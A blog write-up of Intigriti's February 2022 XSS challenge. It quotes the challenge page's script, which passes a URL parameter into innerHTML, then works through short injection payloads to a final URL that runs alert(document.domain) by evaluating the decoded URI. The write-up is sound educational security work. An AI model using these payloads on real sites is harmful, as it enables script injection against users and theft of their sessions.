---
layout: post
title:  "February Xss Challenge Intigriti Writeup"
date:   2022-02-09 00:00:01 +0100
categories: writeup Intigriti
---

### Introduction

The [challenge site](https://challenge-0222.intigriti.io/challenge/xss.html) offers a nice interface which allows you to enter a username and answer to the following question: `Have you ever played this game?`. On submitting the same page is requested again with two parameters in the request: `q` and `first`. The first one contains the username and the second contains the string `yes` or `no` depending on our selection. The details of how this is handled is containined in one single script and can be found by simply inspecting the page source:
```js
window.name = 'XSS(eXtreme Short Scripting) Game'
function showModal(title, content) {
  var titleDOM = document.querySelector('#main-modal h3')
  var contentDOM = document.querySelector('#main-modal p')
  titleDOM.innerHTML = title
  contentDOM.innerHTML = content
  window['main-modal'].classList.remove('hide')
}

window['main-form'].onsubmit = function(e) {
  e.preventDefault()
  var inputName = window['name-field'].value
  var isFirst = document.querySelector('input[type=radio]:checked').value
  if (!inputName.length) {
    showModal('Error!', "It's empty")
    return
  }
  if (inputName.length > 24) {
    showModal('Error!', "Length exceeds 24, keep it short!")
    return
  }
  window.location.search = "?q=" + encodeURIComponent(inputName) + '&first=' + isFirst
}

if (location.href.includes('q=')) {
  var uri = decodeURIComponent(location.href)
  var qs = uri.split('&first=')[0].split('?q=')[1]
  if (qs.length > 24) {
    showModal('Error!', "Length exceeds 24, keep it short!")
  } else {
    showModal('Welcome back!', qs)
  }
}
```

### The Challenge ###

When the page is requested with the `q` and `first` parameters, the `showModal` function is executed and a popup is shown.There is some insecure `innerHTML` assignment in that function! We have a limit of 24 characters on the username (the `q` parameter), but let's try to inject some html code. For instance I tried `<img src=x/>` :

![Image injection](assets/FebChallenge_01.png)

That looks good! The image tag is injected and no sanitization is going on. Despite of this, injecting a script tag would not work because of the length constraints.

### A short payload ###

A collection of very short xss payloads is avaiable at [@terjanq](https://twitter.com/terjanq)'s [github repo](https://github.com/terjanq/Tiny-XSS-Payloads). At first I ended up trying `<svg/onload=alert(name)>`. This should be automatically parsed by the browser and adjusted to a valid `svg` tag. For instance `<svg onload="alert(name)"></svg>`.

![First xss](assets/FebChallenge_02.png)

It worked! But was it really so easy?

>The name variable is usually a propriety of window that can be overwritten by setting up an `iframe`... but not in this case! Looking back to the source code, we can see that the `name` variable is hardcoded at the first line. Nothing to do here! 

### What's next? ###
We have an alert but no arbitrary javascript execution is possible. By injecting `<svg/onload=eval(name)>`, the content of `name` is evaluated and executed. This seems a good way to go but we don't really can control the `name` variable. At this point, I looked for other variables that we can control. To do so, I placed a breakpoint on `contentDOM.innerHTML = content` and inspected the `Scope` tab in the inspector to see all variables We have access in this context. My research revealed only three valid (short enough) strings that we can use: `name`,`qs` and `uri`. Look at that, we can control the uri!

I spent some time trying to get something out of this. At some point I tried the following in the  js console:

```
> https://example
  2
< 2
```
In other words, `https://example` and `1` on the next line is valid javscript! To double check:

```
> eval("https://challenge\n1")
< 1
```
`https:1` is treated as a `key:value` pair, and the fact that they are separated by a comment (starting with `//`) and a newline (`\n`) is not a problem!

### The exploit ###

With this knowledge we can solve the challenge! We control the url and in particular we can set the `first` parameter to anything we want. Because before beeing assigned to `uri`, the url is urlDecoded with `decodeURIComponent()` we can also inject newlines using `%0a`. To make the uri valid we need a newline, a number, a semi-colon and then arbitrary javascript! We can do so by setting the `first` variable to `%0a1;alert(document.domain)`. Our username instead will be set to `<style/onload=eval(uri)>`, to evaluate the uri!
Final payload will be:
```
https://challenge-0222.intigriti.io/challenge/xss.html?q=%3Cstyle%2Fonload%3Deval(uri)%3E&first=%0A1;alert(document.domain);
```
To visit the link you can click [here](https://challenge-0222.intigriti.io/challenge/xss.html?q=%3Cstyle%2Fonload%3Deval(uri)%3E&first=%0A1;alert(document.domain);). 

![Final alert](assets/FebChallenge_03.png)

Alert! Very nice challenge and don't forget to follow [intigriti](https://twitter.com/intigriti) on twitter to stay updated for the ones that are coming!

>Note: I used a `style` tag instead of an `svg` tag because the original payload wasn't firing on firefox. I investigated and it seems like firefox executes the `onload` event on `svg` and `img` tags only when they are loaded from external resources (e.g. they use the `src` attribute).

